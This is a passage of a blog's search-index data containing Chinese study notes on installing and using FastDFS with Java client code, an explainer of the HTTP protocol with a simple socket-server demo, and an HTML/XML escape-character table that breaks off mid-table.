gcc libevent libevent-devel -y\n\n安装libfastcommon：\ngit clone https://github.com/happyfish100/libfastcommon.gitcd libfastcommon/./make.shsudo ./make.sh install\n\n头文件安装在&#x2F;usr&#x2F;include&#x2F;fastcommon目录下动态库安装在&#x2F;usr&#x2F;lib64&#x2F;和&#x2F;usr&#x2F;lib&#x2F;目录下\n\n安装fastdfs\ngit clone https://github.com/happyfish100/fastdfs.gitcd fastdfs./make.shsudo ./make.sh install\n\n工具安装在&#x2F;usr&#x2F;bin&#x2F;目录下：(无需配置环境变量，直接使用)fdfs_delete_file：删除文件fdfs_download_file：下载文件fdfs_upload_file：上传文件fdfs_trackerd：启动tracker服务fdfs_storaged：启动storage服务fdfs_file_info：用来检查一个文件的信息，参数传递一个FastDFS文件\n\n\n配置文件默认安装在&#x2F;etc&#x2F;fdfs&#x2F;目录下：client.conf.sample：客户端默认配置文件storage.conf.sample：storage服务默认配置文件storage_ids.conf.sample：tracker.conf.sample：tracker服务默认配置文件\n\n启动与关闭启动：fdfs_trackerd /etc/fdfs/tracker.conffdfs_storaged /etc/fdfs/storage.conf\n启动成功会有两个服务\n重启：fdfs_trackerd /etc/fdfs/tracker.conf restartfdfs_storaged /etc/fdfs/storage.conf restart\n关闭：fdfs_trackerd /etc/fdfs/tracker.conf stopfdfs_storaged /etc/fdfs/storage.conf stop\n\n可以使用kill关闭，但不建议，因为可能会导致文件信息不同步问题\n\n测试上传上传测试：fdfs_test /etc/fdfs/client.conf upload 文件路径示例：fdfs_test /etc/fdfs/client.conf upload /root/test.txt返回信息：\ntracker_query_storage_store_list_without_group:        server 1. group_name=, ip_addr=127.0.0.1, port=23000group_name=group1, ip_addr=127.0.0.1, port=23000storage_upload_by_filenamegroup_name=group1, remote_filename=M00/00/00/fwAAAWLygpOAUo-DAAAAGhtfdIk672.txtsource ip address: 127.0.0.1file timestamp=2022-08-09 23:51:47file size=26file crc32=459240585example file url: http://127.0.0.1/group1/M00/00/00/fwAAAWLygpOAUo-DAAAAGhtfdIk672.txtstorage_upload_slave_by_filenamegroup_name=group1, remote_filename=M00/00/00/fwAAAWLygpOAUo-DAAAAGhtfdIk672_big.txtsource ip address: 127.0.0.1file timestamp=2022-08-09 23:51:47file size=26file crc32=459240585example file url: http://127.0.0.1/group1/M00/00/00/fwAAAWLygpOAUo-DAAAAGhtfdIk672_big.txt\n\n\n其中group_name&#x3D;group1, remote_filename&#x3D;M00&#x2F;00&#x2F;00&#x2F;fwAAAWLygpOAUo-DAAAAGhtfdIk672.txtgroup1 为 组名、M00 为 磁盘、&#x2F;00&#x2F;00&#x2F; 为 目录、最后是文件名\n\n上传后的文件\n(base) [root@VM-16-9-centos 00]# lltotal 16-rw-r--r-- 1 root root 26 Aug  9 23:51 fwAAAWLygpOAUo-DAAAAGhtfdIk672_big.txt-rw-r--r-- 1 root root 49 Aug  9 23:51 fwAAAWLygpOAUo-DAAAAGhtfdIk672_big.txt-m-rw-r--r-- 1 root root 26 Aug  9 23:51 fwAAAWLygpOAUo-DAAAAGhtfdIk672.txt-rw-r--r-- 1 root root 49 Aug  9 23:51 fwAAAWLygpOAUo-DAAAAGhtfdIk672.txt-m\n\n_big是备份文件，与没有的文件存储内容一样-m是文件的属性文件\n\n测试下载上传测试：fdfs_test /etc/fdfs/client.conf download 组名 远程文件路径示例：fdfs_test /etc/fdfs/client.conf download group1 M00/00/00/fwAAAWLygpOAUo-DAAAAGhtfdIk672.txt返回信息：\nstorage=127.0.0.1:23000download file success, file size=26, file save to fwAAAWLygpOAUo-DAAAAGhtfdIk672.txt\n\n删除文件测试：fdfs_test /etc/fdfs/client.conf delete 组名 远程文件路径\nFastDFS的http访问概述文件上传成功的提示信息中说，我们可以通过某个路径访问上传的文件，但直接访问这个路径是访问不了的。FastDFS提供了一个Nginx扩展模块，利用这个模块，可以通过nginx访问已经上传到FastDFS上的文件。\nFastDFS-nginx扩展模块\n安装nginx并添加扩展模块解压缩扩展模块。\n配置nginx使用./configure --prefix=/usr/local/nginx_fdfs --add-model=扩展模块的src目录添加拓展模块配置完成后make然后make install安装nginx\n配置nginxFastDFS配置(mod_fastdfs.conf)\n基础路径base_path=...tracker_server地址tracker_server=...:22122请求中需要包含组名url_have_group_name = true有几个磁盘存储路径store_path_count=1文件存储路径store_path0=...\nnginx配置(nginx.conf)\n拦截请求路径中包含 &#x2F;group[1-9]&#x2F;M0[0-9] 的请求，用fastdfs的nginx模块进行转发\nlocation ~/group[1-9]/M0[0-9]&#123;    ngx_fastdfs_model;&#125;\n\n启动失败可能的原因：\n\nmod_fastdfs.conf没有放到&#x2F;etc&#x2F;fdfs目录中\n配置文件中有错误。比如基础路径不存在\n\n拓展模块执行流程\n使用Java程序对FastDFS进行操作fastdfs-client-java 项目地址\nmaven依赖\n&lt;!--    引入FastDFS的maven依赖包    这个依赖包不在maven的中央库中，需要对源码进行编译，将客户端代码编译到maven本地库中或直接拷贝依赖包文件到maven库中。--&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.csource&lt;/groupId&gt;        &lt;artifactId&gt;fastdfs-client-java&lt;/artifactId&gt;        &lt;version&gt;1.29-SNAPSHOT&lt;/version&gt;    &lt;/dependency&gt;\n\n创建配置文件（fastdfs.conf）\ntracker_server=127.0.0.1:22122\n\n文件上传：\npublic static void upload() &#123;    TrackerServer ts = null;    StorageServer ss = null;    try &#123;        //读取配置文件，用于将所有的tracker的地址读取到内存中        ClientGlobal.init(&quot;fastdfs.conf&quot;);        TrackerClient tc = new TrackerClient();        ts = tc.getTrackerServer();        ss = tc.getStoreStorage(ts);        //定义Storage的客户端对象，需要用这个对象来完成文件上传、下载、删除操作。        StorageClient sc = new StorageClient(ts, ss);        /*        文件上传        参数1 需要上传文件的绝对路径        参数2 需要上传文件的拓展名        参数3 为文件的属性文件，通常不上传        返回一个string数组，需妥善保管        数组中第一个元素为文件所在组名，第二个元素为文件所在的远程路径名称         */        String[] result = sc.upload_file(&quot;&quot;, &quot;&quot;, null);            &#125; catch (IOException | MyException e) &#123;        e.printStackTrace();    &#125;&#125;\n\n文件下载：\npublic static void download() &#123;    TrackerServer ts = null;    StorageServer ss = null;    try &#123;        //读取配置文件，用于将所有的tracker的地址读取到内存中        ClientGlobal.init(&quot;fastdfs.conf&quot;);        TrackerClient tc = new TrackerClient();        ts = tc.getTrackerServer();        ss = tc.getStoreStorage(ts);        //定义Storage的客户端对象，需要用这个对象来完成文件上传、下载、删除操作。        StorageClient sc = new StorageClient(ts, ss);        /*        文件下载        参数1 需要下载的文件的组名        参数2 需要下载文件的远程文件名        参数3 需要保存的本地文件名        返回一个int类型的数据。返回0 表示文件下载成功，其他值表示文件下载失败         */        int result = sc.download_file(&quot;&quot;, &quot;&quot;, &quot;&quot;);    &#125; catch (MyException | IOException e) &#123;        e.printStackTrace();    &#125;&#125;\n\n文件删除：\npublic static void delete()&#123;    TrackerServer ts = null;    StorageServer ss = null;    try &#123;        //读取配置文件，用于将所有的tracker的地址读取到内存中        ClientGlobal.init(&quot;fastdfs.conf&quot;);        TrackerClient tc = new TrackerClient();        ts = tc.getTrackerServer();        ss = tc.getStoreStorage(ts);        //定义Storage的客户端对象，需要用这个对象来完成文件上传、下载、删除操作。        StorageClient sc = new StorageClient(ts, ss);        /*        文件下载        参数1 需要删除的文件的组名        参数2 需要删除文件的远程文件名        返回一个int类型的数据。返回0 表示文件删除成功，其他值表示文件删除失败         */        int result = sc.delete_file(&quot;&quot;, &quot;&quot;);    &#125; catch (MyException | IOException e) &#123;        e.printStackTrace();    &#125;&#125;\n\nspringboot中关于上传文件大小的配置\n#设置springMVC允许上传的单个文件大小 默认值为1MBspring.servlet.multipart.max-file-size=1MB#设置springMVC允许的表单中请求中允许上传文件总大小 默认值为10MBspring.servlet.multipart.max-request-size=10MB\n\n集群的访问流程集群结构：\n访问流程：\n总结部署分布式的部分省略了。咕这部分用了快十天，划水划了挺久。不过总算结束了。\n","categories":["学习笔记"],"tags":["FastDFS"]},{"title":"HTTP协议详解","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/","content":"HTTP协议介绍超文本传输协议（英文：HyperText Transfer Protocol，缩写：HTTP）是一种用于分布式、协作式和超媒体信息系统的应用层协议，用于如何封装数据。HTTP是万维网的数据通信的基础，它和TCP&#x2F;IP协议簇的其他协议一样，也是用于客户端和服务端的通信。\n\nTCP&#x2F;UDP 是传输层协议，主要解决数据在网络中的传输。IP 是网络层协议，同样解决数据在网络中的传输。\n\n菜鸟教程-http简介\nHTTP 是一个客户端终端（用户）和服务器端（网站）请求和应答的标准协议。协议，即规定了通信信息的格式。我们通过使用网页浏览器或者其它的工具发起 HTTP 请求，这个客户端为我们称之为用户代理程序（user agent）。服务器上存储着一些资源，比如 HTML 文件和图像。我们称这个应答服务器为源服务器（origin server）。\n通常，由 HTTP 客户端发起一个请求，此时创建一个到服务器指定端口（默认是80端口）的 tcp 连接。HTTP 服务器则在那个端口监听客户端的请求。一旦收到请求，服务器会向客户端返回一个状态，比如” HTTP&#x2F;1.1 200 OK”，以及返回的内容，如请求的文件、错误消息、或者其它信息。\n\n常见的 HTTP 服务器有 IIS、nginx、apache、tomcat 等。\n\nHTTP 工作原理以下是 HTTP 请求&#x2F;响应的步骤：\n\n客户端连接到 Web 服务器浏览器向 DNS 服务器请求解析 URL 中的域名对应的 ip 地址，然后 HTTP 客户端与目标服务器建立一个 tcp 连接。\n发送 HTTP 请求通过 tcp 连接，客户端向服务器发送一个 HTTP 请求。请求报文包括 请求行、请求头、空行、请求数据 四部分组成。\n服务器接受请求，处理后返回 HTTP 响应服务器 解析请求、获取资源 ，然后将资源写进响应数据。响应由 状态行、响应头、空行、响应数据 四部分组成。\n服务器释放 tcp 连接若 connection 模式为 close，则服务器主动关闭 tcp 连接，客户端被动关闭连接，释放 tcp 连接。若 connection 模式为 keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求。无论如何都会释放。\n客户端解析响应客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的 HTML 文档和文档的字符集。客户端浏览器读取响应数据HTML，根据 HTML 的语法对其进行格式化，并在浏览器窗口中显示。\n\n所以，从上面的过程来看：\n\nHTTP 是无连接的：无连接的含义是限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接，采用这种方式可以节省传输时间。\nHTTP 是媒体独立的：只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送，客户端以及服务器指定使用适合的MIME-type 内容类型。\nHTTP 是无状态：HTTP协议是无状态协议，无状态是指协议对于事务处理没有记忆能力，缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大，另一方面，在服务器不需要先前信息时它的应答就较快。\n\nHTTP 报文格式一个完整的HTTP协议的报文主要由以下三个部分组成：\n\n起始行（请求行、响应行）：描述请求或响应的基本信息。\n首部字段（请求头、响应头）：使用key-value的形式更加详细的说明报文。\n消息正文（请求体、响应体）：实际的传输数据，不一定是文本，也有可能是图片、音频、视频等二进制数据。\n\n因为HTTP协议是基于 TCP&#x2F;IP 的，所以我们可以写个简单的 socket 程序来获取请求报文。\npublic class HttpSocketTest &#123;    public static void main(String[] args) throws IOException &#123;        // 创建 ServerSocket 监听8080端口        ServerSocket server = new ServerSocket(8000);        Socket socket = server.accept();        // 读取请求报文        InputStream in = socket.getInputStream();        byte[] bytes = new byte[in.available()];        int result = in.read(bytes);        if (result != -1)            System.out.println(new String(bytes));        System.out.println();        // 返回响应报文        OutputStream out = socket.getOutputStream();        StringBuffer response = new StringBuffer();        response.append(&quot;HTTP/1.1 200 OK\\r\\n&quot;);        response.append(&quot;Content-type:text/html\\r\\n\\r\\n&quot;);        response.append(&quot;CurrentTime: &quot;).append(new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;).format(new Date()));        System.out.println(response);        out.write(response.toString().getBytes());        out.flush();        out.close();        in.close();        socket.close();        server.close();    &#125;&#125;\n\n使用浏览器访问： http://localhost:8000/ 即可得到请求报文及我们自己构建的响应报文\nget 请求报文：\nGET /test HTTP/1.1Host: localhost:8000Connection: keep-alive...\n\npost 请求报文\nPOST / HTTP/1.1Host: localhost:8000Content-Type: application/jsonConnection: keep-alive&#123;    &quot;name&quot;:&quot;zs&quot;&#125;\n\n响应报文：\nHTTP/1.1 200 OKContent-type:text/htmlCurrentTime: 2023-02-13 18:37:31\n\n所以，从上面的例子可以得出 http 报文的格式：\n请求报文格式：\n响应报文格式：\nHTTP 请求方法HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。HTTP&#x2F;1.1 协议中共定义了八种方法来以不同方式操作指定的资源。我们目前最常见的有两种一种get，另外一种叫post。这两种方法理论上就足够我们进行所有的资源操作了。但还是细分下比较好，细分后可以使用 RESTful 风格的 API （在SpringBoot笔记中有写过）\n首先来列举下这八种请求方法：\n\n\n\n方法\n描述\n\n\n\nGET\n请求指定的页面信息，并返回实体主体。\n\n\nHEAD\n类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头\n\n\nPOST\n向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。\n\n\nPUT\n从客户端向服务器传送的数据取代指定的文档的内容。\n\n\nDELETE\n请求服务器删除指定的页面。\n\n\nCONNECT\nHTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。\n\n\nOPTIONS\n允许客户端查看服务器的性能。\n\n\nTRACE\n回显服务器收到的请求，主要用于测试或诊断。\n\n\nPATCH\n是对 PUT 方法的补充，用来对已知资源进行局部更新 。\n\n\n\nGET 提交的数据会放在 URL 之后，也就是请求行里面，以?分割 URL 和传输数据，参数之间以&amp;相连，如 user?name&#x3D;zs&amp;id&#x3D;114514 。POST方法是把提交的数据放在 HTTP 包的请求体中。GET 提交的数据大小有限制（因为浏览器对 URL 的长度有限制，比如 IE 的限制是2083个字符，火狐是65536个字符，大概），而 POST 方法提交的数据没有限制。\n\nURIURI（uniform resource identifier），统一资源标识符，用来唯一的标识一个资源。它包含了 URL 和 URN 的概念，是它们的超集。\nURI 的组成：\n\nScheme 指的就是方案，比如 HTTP，HTTPS，FTP 等，我们也可以自定义协议，只要服务器支持即可。Scheme可以是由 字母、数字、**+、-、.** 都是允许的\n在Scheme之后，必须使用 :&#x2F;&#x2F; 把 Scheme 与后面的部分区分开来\n\n\nauthority 包含了用户名和密码（user information），还有主机和端口号。用户名密码在 URI 中明文传输非常不安全，所以除了 ftp 很少使用。通常只使用 host:port\npath 为路径 \nquery 为查询参数 为可选参数，以 ? 开头，参数以 &amp; 分隔，再以 &#x3D; 分开参数名称与数据\nfragment 为段落 为可选参数 以 # 开头，该标识符为辅助资源提供方向。\n\nURL（uniform resource locator），统一资源定位器，它是一种具体的 URI，即URL可以用来标识一个资源，而且还指明了如何 locate 这个资源。\n通过定位来获取资源。所以当目标资源位置发生变化，比如服务器宕机，或者位置变了，URL 就失效了。举个例子： http://localhost:8080/query?id=114514 来介绍它的格式，基本上是 URI 的简化（省去了部分）\n\n协议：一般为 http 或 https。\n主机：通常为域名，有时为 IP 地址。\n端口号：以数字方式表示，若为 http 的默认值 :80 可省略，https 的默认值 :443 端口号数字范围为 0~65536。\npath：以 &#x2F; 字符区别路径中的每一个目录名称，根路径为 &#x2F; 。\n查询：GET模式的窗体参数，以 ? 开头，参数以 &amp; 分隔，再以 &#x3D; 分开参数名称与数据，通常以 UTF-8 的 URL 编码，避开字符冲突的问题。\n\nURN（uniform resource name），统一资源命名，是通过名字来标识资源，比如 C4D038B4BED09FDB1471EF51EC3A32CD\n根据名字就可以找到对应的资源，相比 URL 的好处就是不论资源位置怎么变，都可以找到。但这明显是不现实的，因为这样就需要一个解析器去根据名字找到对应资源。这个解析器相当于 URL 解析域名的根服务器，不过资源与域名相比，不管是类型还是数量，URN的解析器都不太可能实际实现并投入实际使用。所以我们见到的 URI 主要以 URL 为主，基本上可以说 URL 约等于 URI 。\n状态码\n1xx 信息，服务器收到请求，需要请求者继续执行操作\n2xx 成功，操作被成功接收并处理\n3xx 重定向，需要进一步的操作以完成请求\n4xx 客户端错误，请求包含语法错误或无法完成请求\n5xx 服务器错误，服务器在处理请求的过程中发生了错误\n\n一些常见的状态码：\n\n\n\n状态码\n状态码英文名称\n中文描述\n\n\n\n200\nOK\n请求成功。一般用于GET与POST请求\n\n\n204\nNo Content\n无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档\n\n\n301\nMoved Permanently\n永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替\n\n\n302\nMoved Temporarily\n临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI\n\n\n400\nBad Request\n客户端请求的语法错误，服务器无法理解\n\n\n401\nUnauthorized\n请求要求用户的身份认证\n\n\n403\nForbidden\n服务器理解请求客户端的请求，但是拒绝执行此请求（可能因为权限问题）\n\n\n404\nNot Found\n服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面\n\n\n500\nInternal server Error\n服务器内部错误，无法完成请求\n\n\n更多状态码可以参考文档\nHTTP 首部字段HTTP 首部字段是构成 HTTP 报文的要素之一，在客户端与服务器之间以 HTTP 协议进行通信的过程中，无论是请求还是响应都会使用首部字段，它能起到传递额外重要信息的作用，比如报文主体大小、所使用的语言、认证信息、是否缓存、Cookie 等。HTTP&#x2F;1.1 规范定义了如下 47 种首部字段，分为四大类。还有一个其他扩展。\n通用首部字段：请求报文和响应报文都可以使用的首部字段。9个\n\n\n\n首部字段名\n说明\n\n\n\nCache-Control\n控制缓存的行为\n\n\nConnection\n连接的管理\n\n\nDate\n创建报文的日期时间\n\n\nPragma\n报文指令\n\n\nTrailer\n报文末端的首部一览\n\n\nTransfer-Encoding\n指定报文主体的传输编码方式\n\n\nUpgrade\n升级为其他协议\n\n\nVia\n代理服务器的相关信息\n\n\nWarning\n错误通知\n\n\n请求首部字段：从客户端向服务器发送请求报文时使用的首部字段。18个\n\n\n\n首部字段名\n说明\n\n\n\nAccept\n用户代理可处理的媒体类型\n\n\nAccept-Charset\n优先的字符集\n\n\nAccept-Encoding\n优先的内容编码\n\n\nAccept-Language\n优先的语言（自然语言）\n\n\nAuthorizationWeb\n认证信息\n\n\nExpect\n期待服务器的特定行为\n\n\nFrom\n用户的电子邮箱地址\n\n\nHost\n请求资源所在服务器\n\n\nIf-Match\n比较实体标记（ETag）\n\n\nIf-Modified-Since\n比较资源的更新时间\n\n\nIf-None-Match\n比较实体标记（与 If-Match 相反）\n\n\nIf-Range\n资源未更新时发送实体 Byte 的范围请求\n\n\nIf-Unmodified-Since\n比较资源的更新时间（与If-Modified-Since相反）\n\n\nMax-Forwards\n最大传输逐跳数\n\n\nProxy-Authorization\n代理服务器要求客户端的认证信息\n\n\nRange\n实体的字节范围请求\n\n\nReferer\n对请求中 URI 的原始获取方\n\n\nTE\n传输编码的优先级\n\n\nUser-Agent\n客户端程序的信息\n\n\n响应首部字段：从服务器端向向客户端返回响应报文时使用的首部字段。9个\n\n\n\n首部字段名\n说明\n\n\n\nAccept-Ranges\n是否接受字节范围请求\n\n\nAge\n推算资源创建经过时间\n\n\nETag\n资源的匹配信息\n\n\nLocation\n令客户端重定向至指定URI\n\n\nProxy-Authenticate\n代理服务器对客户端的认证信息\n\n\nRetry-After\n对再次发起请求的时机要求\n\n\nServer\nHTTP服务器的安装信息\n\n\nVary\n代理服务器缓存的管理信息\n\n\nWWW-Authenticate\n服务器对客户端的认证信息\n\n\n实体首部字段：针对请求报文和响应报文的实体部分使用的首部字段。10个\n\n\n\n首部字段名\n说明\n\n\n\nAllow\n资源可支持的HTTP方法\n\n\nContent-Encoding\n实体主体适用的编码方式\n\n\nContent-Language\n实体主体的自然语言\n\n\nContent-Length\n实体主体的大小（单位：字节）\n\n\nContent-Location\n替代对应资源的URI\n\n\nContent-MD5\t实体主体的报文摘要\n\n\n\nContent-Range\n实体主体的位置范围\n\n\nContent-Type\n实体主体的媒体类型\n\n\nExpires\n实体主体过期的日期时间\n\n\nLast-Modified\n资源的最后修改日期时间\n\n\n扩展首部字段：非 HTTP 协议标准规定的首部字段，通常由开发者创建，用于某些特殊用途，比如 Cookie、Set-Cookie。\n详细具体的作用就不一一列举了，不然太多了，就成文档了。具体用时可以再根据这些去查具体参数及用法。\ncontent-type 与 MIMEContent-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件。Content-Type 标头告诉客户端实际返回的内容的内容类型。也是客户端告诉服务端请求体中内容的内容形式。\n详细媒体格式可以参考菜鸟教程\nMIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。因为因特网上有非常多不同类型的数据，HTTP 会为每种要通过 web 传输的对象都打上 MIME 类型的数据格式标签。\n比较常用的几种：HTML 格式的文本文档由 text&#x2F;html  类型来标记普通的 ASCII 文本文档由  text&#x2F;plain  类型来标JPEG 版本的图片为  image&#x2F;jpeg  类型GIF 格式的图片为 image&#x2F;gif  类型Apple 的 QuickTime 电影为 video&#x2F;quicktime  类型微软的 PowerPoint 演示文件为 application&#x2F;vnd.ms-powerpoint 类型\n其他更多的 MIME 类型可以参考菜鸟教程\n结尾上文中实现的简单的 socket 程序接受浏览器的 http 请求。如果它加上线程池，便可以同时处理多个请求。另外在对其 http 请求和响应进行封装，便可以实现一个功能简单的 http服务器。\n","categories":["学习笔记"],"tags":["HTTP协议","socket","状态码","URI"]},{"title":"HTML/XML转义字符对照表","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/HTML-XML%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%E5%AF%B9%E7%85%A7%E8%A1%A8/","content":"\n转义字符串（Escape Sequence），即字符实体（Character Entity）分成三部分：第一部分是一个&amp;符号，英文叫ampersand；第二部分是实体（Entity）名字或者是#加上实体（Entity）编号；第三部分是一个分号。\n\n常用的转义字符列表\n\n\n显示\n说明\n实体名称\n十进制编号\n\n\n\n\n半方大的空白\n&amp;ensp;\n&amp;#8194;\n\n\n\n全方大的空白\n&amp;emsp;\n&amp;#8195;\n\n\n\n不断行的空白格\n&amp;nbsp;\n&amp;#160;\n\n\n&lt;\n小于\n&amp;lt;\n&amp;#60;\n\n\n&gt;\n大于\n&amp;gt;\n&amp;#62;\n\n\n&amp;\n&amp;符号\n&amp;amp;\n&amp;#38;\n\n\n“\n双引号\n&amp;quot;\n&amp;#34;\n\n\n©\n版权\n&amp;copy;\n&amp;#169;\n\n\n®\n已注册商标\n&amp;reg;\n&amp;#174;\n\n\n™\n商标（美国）\n&amp;trade;\n&amp;#8482;\n\n\n×\n乘号\n&amp;times;\n&amp;#215;\n\n\n÷\n除号\n&amp;divide;\n&amp;#247;\n\n\nISO 8859-1 (Latin-1)字符集\n\n\n显示\n名称\n十进制\n\n\n\n\n&amp;nbsp;\n&amp;#160;\n\n\n¡\n&amp;iexcl;\n&amp;#161;\n\n\n¢\n&amp;cent;\n&amp;#162;\n\n\n£\n&amp;pound;\n&amp;#163;\n\n\n¤\n&amp;curren;\n&amp;#164;\n\n\n¥\n&amp;yen;\n&amp;#165;\n\n\n¦\n&amp;brvbar;\n&amp;#166;\n\n\n§\n&amp;sect;\n&amp;#167;\n\n\n¨\n&amp;uml;\n&amp;#168;\n\n\n©\n&amp;copy;\n&amp;#169;\n\n\nª\n&amp;ordf;\n&amp;#170;\n\n\n«\n&amp;laquo;\n&amp;#171;\n\n\n¬\n&amp;not;\n&amp;#172;\n\n\n\n&amp;shy;\n&amp;#173;\n\n\n®\n&amp;reg;\n&amp;#174;\n\n\n¯\n&amp;macr;\n&amp;#175;\n\n\n°\n&amp;deg;\n&amp;#176;\n\n\n±\n&amp;plusmn;\n&amp;#177;\n\n\n²\n&amp;sup2;\n&amp;#178;\n\n\n³\n&amp;sup3;\n&amp;#179;\n\n\n´\n&amp;acute;\n&amp;#180;\n\n\nµ\n&amp;micro;\n&amp;#181;\n\n\n¶\n&amp;para;\n&amp;#182;\n\n\n·\n&amp;middot;\n&amp;#183;\n\n\n¸\n&amp;cedil;\n&amp;#184;\n\n\n¹\n&amp;sup1;\n&amp;#185;\n\n\nº\n&amp;ordm;\n&amp;#186;\n\n\n»\n&amp;raquo;\n&amp;#187;\n\n\n¼\n&amp;frac14;\n&amp;#188;\n\n\n½\n&amp;frac12;\n&amp;#189;\n\n\n¾\n&amp;frac34;\n&amp;#190;\n\n\n¿\n&amp;iquest;\n&amp;#191;\n\n\nÀ\n&amp;Agrave;\n&amp;#192;\n\n\nÁ\n&amp;Aacute;\n&amp;#193;\n\n\nÂ\n&amp;Acirc;\n&amp;#194;\n\n\nÃ\n&amp;Atilde;\n&amp;#195;\n\n\nÄ\n&amp;Auml;\n&amp;#196;\n\n\nÅ\n&amp;Aring;\n&amp;#197;\n\n\nÆ\n&amp;AElig;\n&amp;#198;\n\n\nÇ\n&amp;Ccedil;\n&amp;#199;\n\n\nÈ\n&amp;Egrave;\n&amp;#200;\n\n\nÉ\n&amp;Eacute;\n&amp;#201;\n\n\nÊ\n&amp;Ecirc;\n&amp;#202;\n\n\nË\n&amp;Euml;\n&amp;#203;\n\n\nÌ\n&amp;Igrave;\n&amp;#204;\n\n\nÍ\n&amp;Iacute;\n&amp;#205;\n\n\nÎ\n&amp;Icirc;\n&amp;#206;\n\n\nÏ\n&amp;Iuml;\n&amp;#207;\n\n\nÐ\n&amp;ETH;\n&amp;#208;\n\n\nÑ\n&amp;Ntilde;\n&amp;#209;\n\n\nÒ\n&amp;Ograve;\n&amp;#210;\n\n\nÓ\n&amp;Oacute;\n&amp;#211;\n\n\nÔ\n&amp;Ocirc;\n&amp;#212;\n\n\nÕ\n&amp;Otilde;\n&amp;#213;\n\n\nÖ\n&amp;Ouml;\n&amp;#214;\n\n\n×\n&amp;times;\n&amp;#215;\n\n\nØ\n&amp;Oslash;\n&amp;#216;\n\n\nÙ\n&amp;Ugrave;\n&amp;#217;\n\n\nÚ\n&amp;Uacute;\n&amp;#218;\n\n\nÛ\n&amp;Ucirc;\n&amp;#219;\n\n\nÜ\n&amp;Uuml;\n&amp;#220;\n\n\nÝ\n&amp;Yacute;\n&amp;#221;\n\n\nÞ\n&amp;THORN;\n&amp;#222;\n\n\nß\n&amp;szlig;\n&amp;#223;\n\n\nà\n&amp;agrave;\n&amp;#224;\n\n\ná\n&amp;aacute;\n&amp;#225;\n\n\nâ\n&amp;acirc;\n&amp;#226;\n\n\nã\n&amp;atilde;\n&amp;#227;\n\n\nä\n&amp;auml;\n&amp;#228;\n\n\nå\n&amp;aring;\n&amp;#229;\n\n\næ\n&amp;aelig;\n&amp;#230;\n\n\nç\n&amp;ccedil;\n&amp;#231;\n\n\nè\n&amp;egrave;\n&amp;#232;\n\n\né\n&amp;eacute;\n&amp;#233;\n\n\nê\n&amp;ecirc;\n&amp;#234;\n\n\në\n&amp;euml;\n&amp;#235;\n\n\nì\n&amp;igrave;\n&amp;#236;\n\n\ní\n&amp;iacute;\n&amp;#237;\n\n\nî\n&amp;icirc;\n&amp;#238;\n\n\nï\n&amp;iuml;\n&amp;#239;\n\n\nð\n&amp;eth;\n&amp;#240;\n\n\nñ\n&amp;ntilde;\n&amp;#241;\n\n\nò\n&amp;ograve;\n&amp;#242;\n\n\nó\n&amp;oacute;\n&amp;#243;\n\n\nô\n&amp;ocirc;\n&amp;#244;\n\n\nõ\n&amp;otilde;\n&amp;#245;\n\n\nö\n&amp;ouml;\n&amp;#246;\n\n\n÷\n&amp;divide;\n&amp;#247;\n\n\nø\n&amp;oslash;\n&amp;#248;\n\n\nù\n&amp;ugrave;\n&amp;#249;\n\n\nú\n&amp;uacute;\n&amp;#250;\n\n\nû\n&amp;ucirc;\n&amp;#251;\n\n\nü\n&amp;uuml;\n&amp;#252;\n\n\ný\n&amp;yacute;\n&amp;#253;\n\n\nþ\n&amp;thorn;\n&amp;#254;\n\n\nÿ\n&amp;yuml;\n&amp;#255;\n\n\n符号、数学符号和希腊字母 symbols, mathematical symbols, and Greek letters\n\n\n符号\n名称\n十进制\n\n\n\nƒ\n&amp;fnof;\n&amp;#402;\n\n\nΑ\n&amp;Alpha;\n&amp;#913;\n\n\nΒ\n&amp;Beta;\n&amp;#914;\n\n\nΓ\n&amp;Gamma;\n&amp;#915;\n\n\nΔ\n&amp;Delta;\n&amp;#916;\n\n\nΕ\n&amp;Epsilon;\n&amp;#917;\n\n\nΖ\n&amp;Zeta;\n&amp;#918;\n\n\nΗ\n&amp;Eta;\n&amp;#919;\n\n\nΘ\n&amp;Theta;\n&amp;#920;\n\n\nΙ\n&amp;Iota;\n&amp;#921;\n\n\nΚ\n&amp;Kappa;\n&amp;#922;\n\n\nΛ\n&amp;Lambda;\n&amp;#923;\n\n\nΜ\n&amp;Mu;\n&amp;#924;\n\n\nΝ\n&amp;Nu;\n&amp;#925;\n\n\nΞ\n&amp;Xi;\n&amp;#926;\n\n\nΟ\n&amp;Omicron;\n&amp;#927;\n\n\nΠ\n&amp;Pi;\n&amp;#928;\n\n\nΡ\n&amp;Rho;\n&amp;#929;\n\n\nΣ\n&amp;Sigma;\n&amp;#931;\n\n\nΤ\n&amp;Tau;\n&amp;#932;\n\n\nΥ\n&amp;Upsilon;\n&amp;#933;\n\n\nΦ\n&amp;Phi;\n&amp;#934;\n\n\nΧ\n&amp;Chi;\n&amp;#935;\n\n\nΨ\n&amp;P